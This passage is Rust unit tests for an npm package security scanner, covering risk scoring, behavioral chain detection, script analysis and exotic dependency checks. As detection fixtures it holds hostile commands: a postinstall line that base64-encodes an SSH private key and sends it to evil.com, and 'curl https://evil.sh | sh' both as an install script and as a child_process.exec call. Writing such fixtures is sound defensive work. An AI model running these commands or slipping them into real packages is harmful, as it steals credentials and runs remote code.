            .iter()
            .any(|p| p.starts_with("curl:")));
        assert!(audit
            .suspicious_patterns
            .iter()
            .any(|p| p.starts_with("rm -rf:")));
        assert!(audit
            .suspicious_patterns
            .iter()
            .any(|p| p.starts_with("bash -c:")));
    }

    #[test]
    fn suspicious_patterns_clean_script() {
        let s = scanner();
        let mut audit = empty_audit("clean");
        s.check_suspicious_patterns("tsc -p tsconfig.json", &mut audit);
        assert!(audit.suspicious_patterns.is_empty());
    }

    #[test]
    fn risk_level_thresholds() {
        let s = scanner();
        let mut audit = empty_audit("thresholds");
        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Safe);

        // 2 patterns * 8 = 16
        audit.suspicious_patterns = vec!["curl: x".to_string(), "wget: y".to_string()];
        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Low);

        // 4 patterns * 8 = 32
        audit.suspicious_patterns.push("eval: z".to_string());
        audit.suspicious_patterns.push("spawn: w".to_string());
        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Medium);

        // + 2 critical issues * 15 = 62
        audit.source_code_issues = vec![
            issue(IssueSeverity::Critical),
            issue(IssueSeverity::Critical),
        ];
        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::High);

        // + behavioral chain 100 -> >= 100
        audit.behavioral_chains.push(chain(100));
        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Critical);
    }

    #[test]
    fn warning_issues_have_lower_weight() {
        let s = scanner();
        let mut audit = empty_audit("warnings");
        // 2 warnings * 5 = 10 -> Low
        audit.source_code_issues =
            vec![issue(IssueSeverity::Warning), issue(IssueSeverity::Warning)];
        assert_eq!(s.calculate_risk_level(&audit), RiskLevel::Low);
    }

    #[test]
    fn scripts_add_base_risk() {
        let s = scanner();
        let mut audit = empty_audit("scripts");
        audit.has_scripts = true;
        audit.preinstall = Some("echo a".to_string());
        audit.install = Some("echo b".to_string());
        audit.postinstall = Some("echo c".to_string());
        audit.suspicious_patterns = vec!["env: x".to_string()];
        s.calculate_and_assign_risk(&mut audit);
        // 1 pattern * 8 + 3 scripts * 3 = 17
        assert_eq!(audit.risk_score, 17);
        assert_eq!(audit.risk_level, RiskLevel::Low);
    }

    #[test]
    fn detects_data_exfiltration_chain() {
        let s = scanner();
        let mut audit = empty_audit("exfil");
        audit.has_scripts = true;
        audit.postinstall =
            Some("curl https://evil.com?d=$(cat ~/.ssh/id_rsa | base64)".to_string());
        s.detect_behavioral_chains(&mut audit);
        let exfil = audit
            .behavioral_chains
            .iter()
            .find(|c| c.chain_type == AttackChainType::DataExfiltration)
            .expect("exfiltration chain not detected");
        // network + sensitive access + encoding => critical, max score
        assert_eq!(exfil.severity, IssueSeverity::Critical);
        assert_eq!(exfil.risk_score, 100);
    }

    #[test]
    fn no_chains_for_benign_scripts() {
        let s = scanner();
        let mut audit = empty_audit("benign");
        audit.postinstall = Some("echo done".to_string());
        s.detect_behavioral_chains(&mut audit);
        assert!(audit.behavioral_chains.is_empty());
    }

    #[test]
    fn analyze_package_json_with_suspicious_script() {
        let s = scanner();
        let tmp = TempDir::new().unwrap();
        let pkg = tmp.path().join("package.json");
        fs::write(
            &pkg,
            r#"{
                "name": "evil-pkg",
                "scripts": { "postinstall": "curl https://evil.sh | sh" },
                "dependencies": { "left-pad": "^1.0.0" },
                "devDependencies": { "jest": "^29.0.0" }
            }"#,
        )
        .unwrap();

        let audit = s.analyze_package_json(&pkg, "evil-pkg").unwrap();
        assert!(audit.has_scripts);
        assert_eq!(
            audit.postinstall.as_deref(),
            Some("curl https://evil.sh | sh")
        );
        assert!(!audit.suspicious_patterns.is_empty());
        assert!(audit.dependencies.contains(&"left-pad".to_string()));
        assert!(audit.dev_dependencies.contains(&"jest".to_string()));
        assert_ne!(audit.risk_level, RiskLevel::Safe);
        assert!(audit.risk_score > 0);
    }

    #[test]
    fn analyze_package_json_clean_package() {
        let s = scanner();
        let tmp = TempDir::new().unwrap();
        let pkg = tmp.path().join("package.json");
        fs::write(&pkg, r#"{ "name": "clean-pkg", "version": "1.0.0" }"#).unwrap();

        let audit = s.analyze_package_json(&pkg, "clean-pkg").unwrap();
        assert!(!audit.has_scripts);
        assert_eq!(audit.risk_level, RiskLevel::Safe);
        assert_eq!(audit.risk_score, 0);
        assert!(audit.suspicious_patterns.is_empty());
    }

    #[test]
    fn walk_directory_skips_excluded_dirs() {
        let s = scanner();
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join("a.js"), "").unwrap();
        for dir in ["node_modules", ".git", "test", "tests", "sub"] {
            fs::create_dir(tmp.path().join(dir)).unwrap();
            fs::write(tmp.path().join(dir).join("f.js"), "").unwrap();
        }

        let files = s.walk_directory(tmp.path()).unwrap();
        let names: Vec<String> = files
            .iter()
            .map(|p| {
                p.strip_prefix(tmp.path())
                    .unwrap()
                    .to_string_lossy()
                    .to_string()
            })
            .collect();
        assert_eq!(files.len(), 2);
        assert!(names.contains(&"a.js".to_string()));
        assert!(names.iter().any(|n| n.starts_with("sub")));
    }

    #[test]
    fn scan_source_code_flags_malicious_js() {
        let s = scanner();
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join("index.js"),
            "const cp = require('child_process');\ncp.exec('curl https://evil.sh | sh');\n",
        )
        .unwrap();

        let mut audit = empty_audit("malicious");
        s.scan_source_code(tmp.path(), &mut audit);
        assert!(!audit.source_code_issues.is_empty());
    }

    #[test]
    fn source_issue_snippet_handling() {
        let s = scanner();
        let mut audit = empty_audit("snippets");
        s.add_source_issue_with_snippet(
            Path::new("/pkg/i.js"),
            3,
            "Eval",
            "eval use",
            IssueSeverity::Warning,
            "eval(x)",
            &mut audit,
        );
        s.add_source_issue_with_snippet(
            Path::new("/pkg/j.js"),
            7,
            "Eval",
            "eval use",
            IssueSeverity::Info,
            "",
            &mut audit,
        );
        assert_eq!(audit.source_code_issues.len(), 2);
        assert_eq!(
            audit.source_code_issues[0].code_snippet.as_deref(),
            Some("eval(x)")
        );
        assert!(audit.source_code_issues[1].code_snippet.is_none());
    }

    #[test]
    fn export_audit_json_roundtrip() {
        let s = scanner();
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("audit.json");
        let mut audit = empty_audit("pkg");
        audit.risk_level = RiskLevel::Medium;

        s.export_audit_to_json(&audit, path.to_str().unwrap())
            .unwrap();
        let parsed: PackageAudit =
            serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(parsed.package_name, "pkg");
        assert_eq!(parsed.risk_level, RiskLevel::Medium);
    }

    #[test]
    fn export_transitive_json_and_markdown() {
        let s = scanner();
        let tmp = TempDir::new().unwrap();
        let json_path = tmp.path().join("scan.json");
        let md_path = tmp.path().join("scan.md");
        let result = sample_transitive_result();

        s.export_transitive_to_json(&result, json_path.to_str().unwrap())
            .unwrap();
        let parsed: TransitiveScanResult =
            serde_json::from_str(&fs::read_to_string(&json_path).unwrap()).unwrap();
        assert_eq!(parsed.total_packages, 4);
        assert_eq!(parsed.package_audits.len(), 4);

        s.export_transitive_to_markdown(&result, md_path.to_str().unwrap())
            .unwrap();
        let md = fs::read_to_string(&md_path).unwrap();
        assert!(md.contains("# FNPM Security Scan Report"));
        assert!(md.contains("## High & Critical Risk Packages"));
        assert!(md.contains("### bad-pkg (Risk: High)"));
        assert!(md.contains("## Medium Risk Packages"));
        assert!(md.contains("## Low Risk Packages With Findings"));
    }

    #[test]
    fn display_functions_smoke() {
        let s = scanner();
        let result = sample_transitive_result();

        let mut audit = empty_audit("display-pkg");
        audit.has_scripts = true;
        audit.postinstall = Some("curl x | sh".to_string());
        audit
            .suspicious_patterns
            .push("curl: Downloads files from internet".to_string());
        audit
            .source_code_issues
            .push(issue(IssueSeverity::Critical));
        audit.source_code_issues.push(issue(IssueSeverity::Warning));
        audit.behavioral_chains.push(chain(80));
        audit.risk_level = RiskLevel::Critical;
        audit.risk_score = 120;

        s.display_audit_report(&audit);
        s.display_audit_report_with_options(&audit, true);
        s.display_audit_report_with_options(&empty_audit("safe-pkg"), false);
        s.display_transitive_summary(&result);
        s.display_transitive_summary_with_options(&result, true);
        s.display_main_package_from_transitive(&result, "bad-pkg", true);
        s.display_main_package_from_transitive(&result, "missing-pkg", false);
        print_protections_banner(60, true, &["esbuild".to_string()]);
        print_protections_banner(0, false, &[]);
    }

    #[test]
    fn exotic_specifier_classification() {
        assert!(!is_exotic_specifier("^1.2.3"));
        assert!(!is_exotic_specifier("~0.4.0"));
        assert!(!is_exotic_specifier("latest"));
        assert!(!is_exotic_specifier(""));
        assert!(!is_exotic_specifier("./local-pkg"));
        assert!(!is_exotic_specifier("../sibling-pkg"));
        assert!(!is_exotic_specifier("@scope/name"));

        assert!(is_exotic_specifier("git+https://github.com/u/r.git"));
        assert!(is_exotic_specifier("git@github.com:u/r.git"));
        assert!(is_exotic_specifier("github:user/repo"));
        assert!(is_exotic_specifier("https://example.com/pkg.tgz"));
        assert!(is_exotic_specifier("file:../local"));
        assert!(is_exotic_specifier("user/repo"));
    }

    #[test]
    fn exotic_subdeps_scan_finds_violations() {
        let tmp = TempDir::new().unwrap();
        let pkg = tmp.path().join("package.json");
        fs::write(
            &pkg,
            r#"{
                "dependencies": { "good": "^1.0.0", "sketchy": "git+https://x.com/r.git" },
                "devDependencies": { "shorthand": "user/repo" },
                "optionalDependencies": { "fine": "2.0.0" }
            }"#,
        )
        .unwrap();

        let violations = check_exotic_subdeps(&pkg).unwrap();
        assert_eq!(violations.len(), 2);
        let names: Vec<&str> = violations.iter().map(|v| v.package.as_str()).collect();
        assert!(names.contains(&"sketchy"));
        assert!(names.contains(&"shorthand"));
    }

    #[test]
    fn exotic_subdeps_missing_file_is_clean() {
        let violations = check_exotic_subdeps(Path::new("/nonexistent/package.json")).unwrap();
        assert!(violations.is_empty());
    }

    #[test]
    fn release_age_zero_disables_check() {
        // min_age 0 must return None without touching the network
        assert!(check_release_age("left-pad", "latest", 0)
            .unwrap()
            .is_none());
    }
}
